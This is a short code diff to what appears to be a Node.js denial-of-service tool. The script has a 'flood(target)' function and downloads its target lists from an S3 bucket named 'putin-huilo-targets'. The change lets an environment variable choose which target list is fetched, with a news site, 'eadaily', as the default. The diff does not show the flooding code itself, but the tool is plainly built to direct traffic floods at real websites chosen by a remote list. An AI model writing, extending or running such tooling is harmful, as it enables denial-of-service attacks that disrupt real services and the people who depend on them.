@@ -1,5 +1,8 @@
 const https = require('https')
 
+const defaultTarget = 'eadaily';
+const targetedService = process.env.TARGET || defaultTarget;
+
 const total = {};
 const current = {
     error: 0
@@ -117,7 +120,7 @@ async function flood(target) {
 (() => {
     const req = https.request({
         hostname: 'putin-huilo-targets.s3.eu-central-1.amazonaws.com',
-        path: '/targets.json',
+        path: `/${targetedService}.targets.json`,
         port: 443,
         method: 'GET',
     }, (res) => {
